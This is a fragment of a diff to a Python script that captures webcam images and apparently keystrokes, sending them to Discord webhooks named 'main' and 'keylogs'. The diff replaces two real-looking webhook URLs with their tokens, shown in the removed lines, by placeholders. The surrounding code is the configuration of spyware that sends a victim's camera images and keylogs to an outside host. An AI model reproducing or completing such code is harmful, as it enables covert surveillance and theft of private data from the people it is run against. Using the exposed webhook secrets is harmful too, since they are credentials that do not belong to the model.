@@ -37,8 +37,8 @@ camera = cv2.VideoCapture(0)
 returnv, image = camera.read()
 
 webhooks = {
-    'main': 'https://discord.com/api/webhooks/1021439977957113896/usE_r-2vIEO1wjRAHuRcxxmBuz68QCOn-R30LDytAiu4oDrWpM0y-nk8MnnSQW_C81Ro',
-    'keylogs': 'https://discord.com/api/webhooks/1021440049943937094/XbMzCdbbwdlfVbURs8R03uGeA2yPG6xZZPqp34_KgAJF7bUQRjAxxInta3bIRQlDPzcG',
+    'main': '<main webhook>',
+    'keylogs': '<key logger webhook>',
 }
 
 def sendpics():
